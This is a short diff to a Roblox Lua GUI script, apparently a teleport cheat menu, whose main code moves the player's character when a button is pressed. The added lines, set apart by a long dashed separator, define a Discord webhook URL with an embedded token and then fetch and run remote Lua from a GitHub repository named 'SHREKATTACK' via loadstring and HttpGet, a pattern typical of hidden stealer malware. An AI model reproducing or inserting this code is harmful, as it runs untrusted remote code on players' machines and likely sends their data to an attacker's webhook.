@@ -72,3 +72,9 @@ TP4.TextSize = 14.000
 TP4.MouseButton1Down:Connect(function()
 	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-759.86261, -1049.17859, -1618.33423, -0.982740104, -0.000525646668, -0.184990972, 7.14599664e-05, 0.999994814, -0.00322107878, 0.184991702, -0.00317870267, -0.982734919)
 end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+
+_G.webhooksdiscord = "https://discord.com/api/webhooks/949222870083596309/nFxjns2obYliuPj_FigRqGfSpBllg-o2CtJ9iXxDK78rxwcQ14xrl1Hzne9WGy627gDi"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua"),true)()
